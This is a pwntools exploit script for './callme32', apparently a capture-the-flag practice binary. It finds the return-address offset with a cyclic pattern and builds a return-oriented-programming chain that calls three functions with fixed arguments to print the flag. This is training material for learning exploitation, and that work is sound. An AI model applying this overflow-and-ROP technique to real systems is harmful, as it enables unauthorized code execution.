from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './callme32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Locate the functions/strings we need
callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

# Print out the target address
info("%#x callme_one", callme_one)
info("%#x callme_two", callme_two)
info("%#x callme_three", callme_three)

# We will send a 'cyclic' pattern which overwrites the return address on the stack
payload = cyclic(100)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of EIP at the time of crashing
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('located EIP offset at {a}'.format(a=eip_offset))

# ROP
rop = ROP(elf)  # Load rop gadgets
# print(rop.dump())
# pprint(rop.gadgets)

# Address needed to put parameters in registers
pop3 = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
info("%#x pop esi; pop edi; pop ebp; ret;", pop3)

# Craft a new payload which puts the "target" address at the correct offset
payload = flat(
    asm('nop') * eip_offset,
    callme_one,
    pop3,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
    callme_two,
    pop3,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
    callme_three,
    pop3,
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
)

# Send the payload to a new copy of the process
io = start()
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
